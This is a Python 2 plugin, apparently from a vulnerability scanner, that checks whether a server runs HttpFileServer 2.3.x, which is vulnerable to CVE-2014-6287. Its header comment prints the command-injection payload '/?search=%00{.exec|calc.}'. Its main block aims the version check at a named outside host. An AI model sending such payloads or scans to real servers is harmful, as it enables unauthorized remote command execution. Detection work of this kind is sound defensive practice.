from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Version: 2.3.x
# CVE : CVE-2014-6287
# EXP : /?search=%00{.exec|calc.}
import urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = "/?search=hfs"
        url = arg + payload
        code, head, res, errcode, _ = curl.curl(url)
        if code == 200 and "HFS 2.3" in head and "HttpFileServer v2.3" in res:
            output(url,result,'hole')


        del curl
        return result


def output(url,result,label):
    info = url + '   httpfileserver Remote Command Execution'
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']=' Remote Command Execution'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/httpfileserver.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_09b555e576587834587dd7e553445fcd.py
#/root/github/poccreate/codesrc/exp-683.py